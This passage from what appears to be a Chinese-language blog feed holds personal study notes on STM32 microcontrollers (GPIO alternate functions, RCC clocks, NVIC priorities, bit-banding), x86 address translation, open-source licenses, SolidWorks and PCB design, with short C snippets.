title="映射和复用的关系"></a>映射和复用的关系</h1><p>在<code>stm32f1</code>系列中，有复用和重新映射的区别：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403161657937.png"></p><p>在<code>stm32f4</code>系列中，有复用和附加功能的区别：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403102254811.png"></p><p><code>Additionalfunctions</code>：附加，辅助功能，引脚被连接到其他模块使用，使用时直接普通配置即可，例如ADC的采用输入通道，配置为模拟输入。</p><p><code>Alternate functions</code>:复用功能，即将IO口用作普通输入输出以外的功能，例如串口输入输出，使用时需要配置复用模式。</p><h2 id="在编程上的区别"><a href="#在编程上的区别" class="headerlink" title="在编程上的区别"></a>在编程上的区别</h2><p>实际上，在<code>f1</code>系列芯片中有重映射，但是在<code>f4</code>系列中是没有重映射的，取而代之的是<strong>附加功能</strong>。</p><p>与<code>f1</code>系列在GPIO中最大的不同就是这个复用功能。F1系列有默认复用，F4没有默认复用，所以F4在配置复用功能时需要给Alternate变量赋值，F1没有这个变量。</p><p>在<code>f4</code>中，每组I&#x2F;O口都对应着一个<strong>复用器</strong>，如GPIOA对应着一个复用器、GPIOB对应着一个复用器……每个复用器分为两部分，如GPIOA对应的复用器分为GPIOA_AFRL、GPIOA_AFRH两部分，其中GPIOx_AFRL负责低8位引脚，即PA0 ~ PA7；而GPIOx_AFRH负责高8位引脚，即PA8 ~ PA15。<strong>不是所有的PA引脚都有复用功能，具体的可以去数据手册中查看。</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403161646849.png"></p><p>上面这个图就是GPIOA所连接的复用器，这个图标需要和标准库中的函数<code>void GPIO_PinAFConfig(GPIO_TypeDef* GPIOx, uint16_t GPIO_PinSource, uint8_t GPIO_AF)</code>有关系：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">GPIO_PinAFConfig</span><span class="hljs-params">(GPIO_TypeDef* GPIOx, <span class="hljs-type">uint16_t</span> GPIO_PinSource, <span class="hljs-type">uint8_t</span> GPIO_AF)</span><br><br><span class="hljs-comment">//引脚复用函数，将前两个参数提供的引脚复用至GPIO_AF，这个GPIO_AF的选择就是通过上面这个表来的。</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403161639032.png"></p><p>复用上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span> 打开GPIO外设的时钟，如 <br>RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);<br><span class="hljs-number">2.</span> 打开复用外设的时钟，如<br>RCC_APB2PeriphClockCmd(RCC_APB2Periph_USART1, ENABLE);<br><span class="hljs-number">3.</span> 使用复用器函数，如<br><span class="hljs-type">void</span> <span class="hljs-title function_">GPIO_PinAFConfig</span><span class="hljs-params">(GPIO_TypeDef* GPIOx, <span class="hljs-type">uint16_t</span> GPIO_PinSource, <span class="hljs-type">uint8_t</span> GPIO_AF)</span><br><br></code></pre></td></tr></table></figure><p>附加功能上（就是f1系列的重映射）：</p><p>附加功能配置，可以从手册中看到，附加功能几乎是ADC或是DAC，在使用对应引脚时只需要将引脚模式设置为GPIO_MODE_ANALOG模拟即可，不需要设置Alternate复用变量，还有对应外设的初始化即可。</p><p><strong>也就是说，f4系列的附加功能的使用就是将<code>GPIO</code>的方向改为模拟</strong>。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.51cto.com/u_15315240/3229581">https://blog.51cto.com/u_15315240/3229581</a></p><p><a href="http://news.eeworld.com.cn/mcu/ic557652.html?ipcity__1865=CqfxR7D=PxuDlxGgx+Oewnq0KDtGCb98eD&alichlgref=http://news.eeworld.com.cn/mcu/ic557652.html">http://news.eeworld.com.cn/mcu/ic557652.html?ipcity__1865=CqfxR7D%3DPxuDlxGgx%2BOewnq0KDtGCb98eD&amp;alichlgref=http%3A%2F%2Fnews.eeworld.com.cn%2Fmcu%2Fic557652.html</a></p><p><a href="https://blog.csdn.net/plmm__/article/details/132045377?spm=1001.2014.3001.5502">https://blog.csdn.net/plmm__/article/details/132045377?spm=1001.2014.3001.5502</a></p><p><a href="https://blog.csdn.net/plmm__/article/details/132045377?spm=1001.2014.3001.5502">https://blog.csdn.net/plmm__/article/details/132045377?spm=1001.2014.3001.5502</a></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCC片上外设</title>
    <link href="/2023/11/17/RCC%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2023/11/17/RCC%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>RCC片上外设</p><span id="more"></span><h1 id="什么是RCC"><a href="#什么是RCC" class="headerlink" title="什么是RCC"></a>什么是RCC</h1><p>RCC ：reset clock control  复位和时钟控制器。</p><p>作用：设置系统时钟SYSCLK、设置AHB分频因子（决定HCLK等于多少）、设置APB2分频因子（决定PCLK2等于多少）、 设置APB1分频因子（决定PCLK1等于多少）、设置各个外设的分频因子；控制AHB、APB2和APB1这三条总线时钟的开启、 控制每个外设的时钟的开启。</p><p>简而言之就是<strong>配置时钟树</strong></p><p>对于SYSCLK、HCLK、PCLK2、PCLK1这四个时钟的配置一般是： PCLK2 &#x3D; HCLK &#x3D; SYSCLK&#x3D;PLLCLK &#x3D; 72M， PCLK1&#x3D;HCLK&#x2F;2 &#x3D; 36M。这个时钟配置也是库函数的标准配置，我们用的最多的就是这个。</p><h1 id="RCC时钟树"><a href="#RCC时钟树" class="headerlink" title="RCC时钟树"></a>RCC时钟树</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120033988.png"></p><p>stm32有高速、低速、内部、外部时钟信号。一共有四种选择，<code>H</code>代表的是高，<code>I</code>代表的是内部。</p><p>一般高速时钟是提供给外设和系统的，低速时钟给<code>RTC</code>、<code>看门狗</code>使用。</p><h1 id="RCC的配置函数"><a href="#RCC的配置函数" class="headerlink" title="RCC的配置函数"></a>RCC的配置函数</h1>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>片上外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NVIC</title>
    <link href="/2023/11/17/NVIC/"/>
    <url>/2023/11/17/NVIC/</url>
    
    <content type="html"><![CDATA[<p>总结stm32异常与中断</p><span id="more"></span><h1 id="谁在管理这stm32中的中断"><a href="#谁在管理这stm32中的中断" class="headerlink" title="谁在管理这stm32中的中断"></a>谁在管理这stm32中的中断</h1><p>NVIC（内嵌中断向量管理器），它管理着stm32中的所有中断。控制着整个芯片的功能，其实内核上的一个外设。但是各个芯片厂商在设计自己的芯片的时候会对Cortex内核中的NVIC进行裁减，所以一般来说我们使用的芯片中的NVIC都是源内核NVIC的子集。</p><h1 id="优先级的定义"><a href="#优先级的定义" class="headerlink" title="优先级的定义"></a>优先级的定义</h1><p>下图是stm32f10x的优先级分配寄存器的位。stm32使用了4bit进行分配优先级。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311172145489.png"></p><p>stm32中的系统异常和中断都定义在文件<code>stm32f10x.h</code>的<code>IRQn_Type</code>枚举中。</p><p>其中系统异常有8个（如果把Reset和HardFault也算上的话就是10个）</p><p>中断数是60个。</p><h2 id="stm32中中断的特点："><a href="#stm32中中断的特点：" class="headerlink" title="stm32中中断的特点："></a>stm32中中断的特点：</h2><p><strong>stm32中的中断和异常没有区别，只是系统的中断称之为异常，外设的中断称之为中断</strong></p><p><strong>中断悬起：当一个中断无法被马上反应的话，称之为中断悬起</strong></p><p><strong>数字越小优先级越高</strong></p><p><strong>有 3 个系统异常：复位，NMI 以及硬 fault，它们有固定的优先级，并且它们的优先级号是负数，从而高于所有其它异常。所有其它异常的优先级则都是可编程的，但不能被编程为负数。</strong></p><p>优先级的分类：在stm32中，优先级包含了<strong>主优先级</strong>、<strong>子优先级</strong>。<br>stm32中判断一个中断的优先级的顺序是：主优先级-&gt;子优先级-&gt;硬件中断编号（这个就是在<code>stmf10x.h</code>文件中的<code>IRQn_Type</code>的编号。</p><hr><h2 id="优先级的分组"><a href="#优先级的分组" class="headerlink" title="优先级的分组"></a>优先级的分组</h2><p><strong>抢占优先级就是主优先级</strong></p><p>在stm32中，优先级一共有<strong>5</strong>个优先级分组：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311172243927.png" alt="优先级分组"></p><p><strong>也就是说如果配置为分组0，则相当于没有主优先级。只有子优先级，优先级的所有位都表示为子优先级。</strong></p><p>例如，当优先级寄存器中的前四bit是，<code>1011</code>时，设置优先级分组为2。所以这时，主优先级为0b10，而子优先级为0b11。<strong>高位表示的是主优先级，低位表示的是子优先级。</strong></p><p>注意：<strong>如果优先级分组为0，则抢占优先级就不存在，优先级就全部由子优先级控制</strong>，所以如果优先级为4，则子优先级就不存在。</p><p>由优先级的分组可以知道，如果分组号越小，则主优先级数目越少。实际上就是降低了其优先级。</p><h2 id="内核外设的优先级如何和片上外设的优先级比较"><a href="#内核外设的优先级如何和片上外设的优先级比较" class="headerlink" title="内核外设的优先级如何和片上外设的优先级比较"></a>内核外设的优先级如何和片上外设的优先级比较</h2><p>由于我们知道看，内核外设是没有主优先级和子优先级的区别的。那么如何比较内核外设和片上外设的优先级：</p><p>在STM32F103中， 只有位7:4这高四位有效，低四位没有用到，所以内核外设的中断优先级可编程为：0~15，只有16个可编程优先级，数值越小，优先级越高。</p><p>不同于片上外设具有的抢占优先级和子优先级，内核外设只有一个优先级，但是优先级的分组是对于所有的外设都有效的。例如：</p><p>SysTick设置优先级组为组1，所以优先级中，有一位用来表示抢占优先级，有三位用来表示子优先级。</p><h2 id="抢占优先级和子优先级对于中断的关系"><a href="#抢占优先级和子优先级对于中断的关系" class="headerlink" title="抢占优先级和子优先级对于中断的关系"></a>抢占优先级和子优先级对于中断的关系</h2><ol><li><p>高抢占优先级是可以打断正在进行的低抢占优先级中断的。</p></li><li><p>抢占优先级相同的中断，高子优先级不可以打断低子优先级的中断。</p></li><li><p>抢占优先级相同的中断，当两个中断同时发生的情况下，哪个子优先级高，就先执行。</p></li><li><p>如果两个中断的抢占优先级和响应优先级都是一样的话，则看哪个中断先发生就先执行；</p></li></ol><hr><h1 id="NVIC的控制函数"><a href="#NVIC的控制函数" class="headerlink" title="NVIC的控制函数"></a>NVIC的控制函数</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311172142813.png" alt="库函数中的NVIC控制函数"></p><h1 id="中断编程"><a href="#中断编程" class="headerlink" title="中断编程"></a>中断编程</h1><h2 id="中断编程的步骤"><a href="#中断编程的步骤" class="headerlink" title="中断编程的步骤"></a>中断编程的步骤</h2><ol><li>开启外设的中断</li><li>定义<code>NVIC_InitTypeDef</code>结构体，初始化NVIC配置</li><li>编写中断服务函数</li></ol><h3 id="NVIC-InitTypeDef结构体解释"><a href="#NVIC-InitTypeDef结构体解释" class="headerlink" title="NVIC_InitTypeDef结构体解释"></a><code>NVIC_InitTypeDef</code>结构体解释</h3><p><code>NVIC_InitTypeDef</code>该结构体定义在<code>misc.h</code>文件中,具体的成员如下：</p><pre><code class="hljs"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span> NVIC_IRQChannel;                    <span class="hljs-comment">// 中断源</span><br>    <span class="hljs-type">uint8_t</span> NVIC_IRQChannelPreemptionPriority;  <span class="hljs-comment">// 抢占优先级</span><br>    <span class="hljs-type">uint8_t</span> NVIC_IRQChannelSubPriority;         <span class="hljs-comment">// 子优先级</span><br>    FunctionalState NVIC_IRQChannelCmd;         <span class="hljs-comment">// 中断使能或者失能</span><br>&#125; NVIC_InitTypeDef;<br></code></pre></td></tr></table></figure></code></pre><p><code>NVIC_IRQChannel</code>：配置中断源，这个源就是在<code>stmf10x.h</code>文件中的<code>IRQn_Type</code></p><p><code>NVIC_IRQChannelPreemptionPriority</code>：具体由优先级的分组决定</p><p><code>NVIC_IRQChannelSubPriority</code>：具体由优先级的分组决定</p><p><code>NVIC_IRQChannelCmd</code>：开启中断或者是关闭中断</p><h3 id="编写中断服务函数"><a href="#编写中断服务函数" class="headerlink" title="编写中断服务函数"></a>编写中断服务函数</h3><p>在启动文件<code>startup_stm32f10x_hd.s</code>中我们预先为每个中断都写了一个中断服务函数，<strong>只是这些中断函数都是为空，为的只是初始化中断向量表。</strong> 实际的中断服务函数都需要我们重新编写，为了方便管理我们把中断服务函数统一写在<code>stm32f10x_it.c</code>这个库文件中。</p><p>关于中断服务函数的函数名必须跟启动文件里面预先设置的一样，如果写错，系统就在中断向量表中找不到中断服务函数的入口， 直接跳转到启动文件里面预先写好的空函数，并且在里面无限循环，实现不了中断。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>《CM3权威指南（中文本）》</p><p>野火stm32教程</p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>内核外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中的位带</title>
    <link href="/2023/11/17/stm32%E4%B8%AD%E7%9A%84%E4%BD%8D%E5%B8%A6/"/>
    <url>/2023/11/17/stm32%E4%B8%AD%E7%9A%84%E4%BD%8D%E5%B8%A6/</url>
    
    <content type="html"><![CDATA[<p>总结stm32中的位带</p><span id="more"></span><h1 id="为什么存在位带"><a href="#为什么存在位带" class="headerlink" title="为什么存在位带"></a>为什么存在位带</h1><p>我们知道在stm32中无法直接控制寄存器中的一个<strong>单独的bit</strong>，所以我们使用<code>&amp; ^ ~</code>这类的位操作来对1<code>byte</code>操作，以防止改变不需要改变的位。</p><p><strong>为了解决stm32中的无法直接控制某一个bit的文件，arm公司使用位带来提供相关服务</strong></p><h1 id="位带的形成"><a href="#位带的形成" class="headerlink" title="位带的形成"></a>位带的形成</h1><p>通过映射的方式，将1bit膨胀到32bit。4字节对应的就是那1Bit位的地址，而这个地址中的数据只有最低一位才有效（LSB）。为什么膨胀到4字节后只有最低位有效？这是因为stm32是32位的，4字节是最高效的。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311171630899.png" alt="位带的映射关系"></p><p>映射的范围：只有SRAM块和片上外设块的最低的1mb内存被映射到了32mb的地址中<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311171641845.png"></p><p>STM32的<strong>全部寄存器</strong>都可以通过访问位带别名区的方式来达到访问原始寄存器比特位的效果，这比51单片机强大很多。 </p><h1 id="转换公式"><a href="#转换公式" class="headerlink" title="转换公式"></a>转换公式</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITBAND(addr, bitnum) ((addr &amp; 0xF0000000)+0x02000000+((addr &amp; 0x00FFFFFF)&lt;&lt;5)+(bitnum&lt;&lt;2))</span><br></code></pre></td></tr></table></figure><h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>位带操作的应用场景，通常在于对IO口进行输入输出读取和控制。</p><p>这就和51单片机中直接的端口赋值是一样的。</p><p>比如</p><p>P0.0 &#x3D; 0;</p><p>P0.0 &#x3D; 1;</p><p>直接就是对端口P0.0输出0和1。</p><h1 id="位带的优点"><a href="#位带的优点" class="headerlink" title="位带的优点"></a>位带的优点</h1><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://news.eeworld.com.cn/mcu/ic549482.html?ipcity__1865=n4Uxu7DtDQD=itG7zD/FnYO6I=G=eziK4D&alichlgref=http://news.eeworld.com.cn/mcu/ic549482.html">http://news.eeworld.com.cn/mcu/ic549482.html?ipcity__1865=n4Uxu7DtDQD%3DitG7zD%2FFnYO6I%3DG%3DeziK4D&amp;alichlgref=http%3A%2F%2Fnews.eeworld.com.cn%2Fmcu%2Fic549482.html</a></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理地址、虚拟地址、逻辑地址、线性地址之间的关系</title>
    <link href="/2023/11/16/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E3%80%81%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E3%80%81%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80%E3%80%81%E7%BA%BF%E6%80%A7%E5%9C%B0%E5%9D%80%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2023/11/16/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E3%80%81%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E3%80%81%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80%E3%80%81%E7%BA%BF%E6%80%A7%E5%9C%B0%E5%9D%80%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<p>物理地址、虚拟地址、逻辑地址、线性地址之间的关系</p><span id="more"></span><h1 id="什么是物理地址"><a href="#什么是物理地址" class="headerlink" title="什么是物理地址"></a>什么是物理地址</h1><p>在计算机中，机械硬盘使用非常广泛。通过机械硬盘的结构，我们可以知道物理地址是如何来的。</p><p>机械硬盘将几个磁盘连接在一起，每一个磁盘都可以看作一个个同心圆组成的，每一个同心圆被称之为一个<strong>磁道</strong>，每一个<strong>磁道</strong>又被划分为一个个<strong>扇区</strong>，所以<strong>扇区</strong>是磁盘上的最小存储单位。<strong>扇区</strong>常常又被称之为<strong>数据块</strong>（一个数据块通常大小为512byte）。通过给这些<strong>数据块</strong>来编号，这就是物理地址。</p><h2 id="物理地址的由来"><a href="#物理地址的由来" class="headerlink" title="物理地址的由来"></a>物理地址的由来</h2><p>物理地址由<strong>内存控制器</strong>生成，然后传递给内存中的存储单元。当处理器需要访问内存中的数据时，它将请求发送到内存控制器，内存控制器会根据物理地址找到对应的存储单元，并将其中的数据返回给处理器。</p><h1 id="什么是虚拟地址"><a href="#什么是虚拟地址" class="headerlink" title="什么是虚拟地址"></a>什么是虚拟地址</h1><p><strong>虚拟地址是CPU保护模式下的一个概念</strong>，保护模式是80286系列和之后的x86兼容CPU操作模式，在CPU引导完操作系统内核后，操作系统内核会进入一种CPU保护模式，也叫虚拟内存管理，在这之后的程序在运行时都处于虚拟内存当中。</p><h2 id="为什么需要使用虚拟地址"><a href="#为什么需要使用虚拟地址" class="headerlink" title="为什么需要使用虚拟地址"></a>为什么需要使用虚拟地址</h2><ol><li>安全，不直接使用物理地址。避免了直接将底层暴露出来</li><li>方便管理，在多进程的计算机中，直接使用物理内存不方便程序员管理。</li><li>更适合多进程。虚拟地址有远远大于物理地址的容量。</li></ol><h1 id="物理地址和虚拟地址之间的转换"><a href="#物理地址和虚拟地址之间的转换" class="headerlink" title="物理地址和虚拟地址之间的转换"></a>物理地址和虚拟地址之间的转换</h1><h2 id="从宏观上来看："><a href="#从宏观上来看：" class="headerlink" title="从宏观上来看："></a>从宏观上来看：</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311161641181.png"></p><p>从上面可以看到虚拟地址和物理地址之间的转换路径。</p><blockquote><p>首先通过查询TLB（转址旁路缓存，TLB中存储了上次进行地址转换使用过的转换关系），如果没有对应的地址的转换关系的话，就直接进行转换。否则直接访问内存。</p></blockquote><h2 id="如何进行转换的？"><a href="#如何进行转换的？" class="headerlink" title="如何进行转换的？"></a>如何进行转换的？</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311161652458.png"><br>通过上面的图，可以看到具体的转换过程。</p><blockquote><p>需要注意的是，如果开启了换页机制则，需要将线性地址转换为物理地址，如果没有开启换页机制则线性地址直接就是物理地址。不需要转换。</p></blockquote><h1 id="程序运行中的各地址转换"><a href="#程序运行中的各地址转换" class="headerlink" title="程序运行中的各地址转换"></a>程序运行中的各地址转换</h1><p>在程序中，我们使用的偏移地址，这个偏移地址是相对于段来说的。<br>那么偏移地址如何转换成为一个物理地址？</p><h2 id="偏移地址的组成"><a href="#偏移地址的组成" class="headerlink" title="偏移地址的组成"></a>偏移地址的组成</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311161757109.png"></p><p>通过上面的图可以知道，偏移地址是由<strong>段选择符+段内偏移值</strong>组成的。</p><p>段选择符的组成：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311161808553.png"></p><ul><li><p>TI标识了使用LDT还是GDT</p></li><li><p>索引号就是段描述符表中的索引</p></li><li><p>整体的转换流程如图所示：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311161807827.png"></p><ol><li>根据段选择符中的TI位确定使用GDT还是LDT，再根据寄存器获取要使用的段描述符表的地址</li><li>段选择符的前13位是段描述符表中的索引，据此得到段描述符，这样就取到了段的基地址Base</li><li>Base + offset就是要转换的线性地址了</li></ol></li></ul><h2 id="线性地址"><a href="#线性地址" class="headerlink" title="线性地址"></a>线性地址</h2><p>线性地址是逻辑地址转换成物理地址的中间层，CPU的MMU（内存管理单元）负责将线性地址转换成物理地址。</p><p>为了节省空间，引入了页目录和页表的概念，每个进程都有自己的页目录，它的地址存储在CPU的寄存器中。<br>以32位机为例。一个32位的线性地址被分为3部分：</p><p>页目录索引（10位）<br>页表索引（10位）<br>偏移（12位）</p><p>转换的过程：</p><p>从CPU寄存器cr3中获取到页目录地址（操作系统在调度进程的时候，负责将页目录地址放入寄存器）<br>根据线性地址的页目录索引部分，去页目录中找到页表<br>根据线性地址的页表索引部分，找到页的起始地址<br>起始地址 + 偏移，就得到了物理地址</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311161820121.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虚拟地址是一个宽泛的概念，<strong>其可以是偏移地址、也可以是线性地址</strong>，总之不是物理地址的地址一般称之为虚拟地址。</p><p>程序员编程（逻辑地址）&lt;—通过算法–&gt;操作系统（虚拟地址）&lt;—通过内存管理单元–&gt;物理元件（物理地址）</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://blog.timd.cn/virtual-address/">http://blog.timd.cn/virtual-address/</a></p><p><a href="https://www.cnblogs.com/fengxing999/p/11022872.html">https://www.cnblogs.com/fengxing999/p/11022872.html</a></p><p><a href="https://wiki.osdev.org/GDT_Tutorial">https://wiki.osdev.org/GDT_Tutorial</a></p><p><a href="https://blog.csdn.net/bjbz_cxy/article/details/78508795">https://blog.csdn.net/bjbz_cxy/article/details/78508795</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的开源协议总结</title>
    <link href="/2023/11/16/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/16/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>常见的开源协议总结</p><span id="more"></span><h1 id="常见的软件开源协议"><a href="#常见的软件开源协议" class="headerlink" title="常见的软件开源协议"></a>常见的软件开源协议</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401011604470.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/61590003177751b9d5bd.jpg"></p><h1 id="CC协议-Creative-Commons-知识共享协议"><a href="#CC协议-Creative-Commons-知识共享协议" class="headerlink" title="CC协议(Creative Commons 知识共享协议)"></a>CC协议(Creative Commons 知识共享协议)</h1><p>这篇blog就是使用的CC协议，那么CC协议的具体内容是什么？</p><h2 id="开源、可修改、非商用"><a href="#开源、可修改、非商用" class="headerlink" title="开源、可修改、非商用"></a>开源、可修改、非商用</h2><p>大多数的比较严格的CC协议会声明 “署名权，非商业用途，禁止衍生”条款，这意味着你可以自由的分享这个作品，但你不能改变它和对其收费，而且<strong>必须声明作品的归属</strong>。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.runoob.com/w3cnote/open-source-license.html">菜鸟教程</a></p><p><a href="https://creativecommons.org/licenses/by/4.0/deed.zh-hans">CC官网</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sw建模</title>
    <link href="/2023/11/13/sw%E5%BB%BA%E6%A8%A1/"/>
    <url>/2023/11/13/sw%E5%BB%BA%E6%A8%A1/</url>
    
    <content type="html"><![CDATA[<p>SW建模总结、网站汇总</p><span id="more"></span><h1 id="插入-扣合特征"><a href="#插入-扣合特征" class="headerlink" title="插入-&gt;扣合特征"></a>插入-&gt;扣合特征</h1><p><a href="https://www.maoliangcat.com/23140">装配凸台</a></p><p><a href="https://www.maoliangcat.com/2336">弹簧扣凹槽</a></p><blockquote><p>弹簧扣凹槽和弹簧扣是配套的</p></blockquote><p><a href="https://www.maoliangcat.com/2358">唇缘和凹槽</a></p><div class="note note-success">            <p>这个需要注意壁厚，如果壁太薄，则会导致唇缘生成失败</p>          </div><p><a href="https://www.maoliangcat.com/1220">通风口</a></p><p><a href="https://help.solidworks.com/2023/chinese-simplified/SolidWorks/sldworks/HIDD_DVE_LIP_AND_GROOVE.htm">sw官方手册</a></p>]]></content>
    
    
    <categories>
      
      <category>SW</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单片机开发</title>
    <link href="/2023/11/13/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91/"/>
    <url>/2023/11/13/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>单片机知识总结</p><span id="more"></span><h1 id="前置常识"><a href="#前置常识" class="headerlink" title="前置常识"></a>前置常识</h1><p><a href="https://blog.csdn.net/wangyx1234/article/details/107300913">芯片、模组、开发板之间的关系</a></p><p><a href="http://www.cntronics.com/kbupload/kb_1412249007_0.pdf">为什么需要封装</a></p><p><a href="https://cloud.tencent.com/developer/article/1662822">乐鑫和安信可之间的关系</a></p><p><a href="https://www.cnblogs.com/kerwincui/p/11841851.html">常见的电气符号</a></p><p><a href="http://blog.itpub.net/70010283/viewspace-2896406/">硬件开发基本流程</a></p><h1 id="PCB板"><a href="#PCB板" class="headerlink" title="PCB板"></a>PCB板</h1><h2 id="绘制的步骤"><a href="#绘制的步骤" class="headerlink" title="绘制的步骤"></a>绘制的步骤</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/80048B6758ADB6E9DA30FB6C5AD7A94C.jpg"></p><h2 id="布线的原则和注意事项"><a href="#布线的原则和注意事项" class="headerlink" title="布线的原则和注意事项"></a>布线的原则和注意事项</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/907AF3055731A9306AB06656693083A9.jpg"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/22D8AE762EC238BE34B324B30D66AB7D.jpg"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1>]]></content>
    
    
    <categories>
      
      <category>单片机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的内存管理</title>
    <link href="/2023/11/12/Linux%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2023/11/12/Linux%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
